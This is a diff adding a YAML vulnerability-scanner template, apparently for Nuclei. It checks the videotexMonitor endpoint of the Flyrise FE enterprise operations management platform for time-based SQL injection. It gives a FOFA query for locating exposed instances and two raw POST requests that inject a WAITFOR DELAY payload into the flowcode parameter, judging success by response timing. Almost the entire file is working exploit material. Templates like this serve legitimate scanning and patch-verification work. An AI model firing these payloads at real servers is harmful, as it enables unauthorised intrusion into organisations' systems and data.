@@ -1,0 +1,60 @@
+id: poc-yaml-flyrise-videotexmonitor-sqli
+info:
+  name: 飞企互联-FE企业运营管理平台 videotexMonitor SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 企业运营管理平台
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+variables:
+  t1: "{{rand_int(5,9)}}"
+  t2: "{{to_number(t1)+2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3)+2}}"
+http:
+  - raw:
+      - |
+        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:{{t1}}'--&dialogid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "子任务信息"
+          - "环节名称"
+          - "办理用户"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
+
+  - raw:
+      - |
+        POST /cooperate/videotexMonitor.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        master_key=1&flowcode=1';WAITFOR+DELAY '0:0:{{t3}}'--&dialogid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "子任务信息"
+          - "环节名称"
+          - "办理用户"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t3)"
+          - "duration <= to_number(t4)"
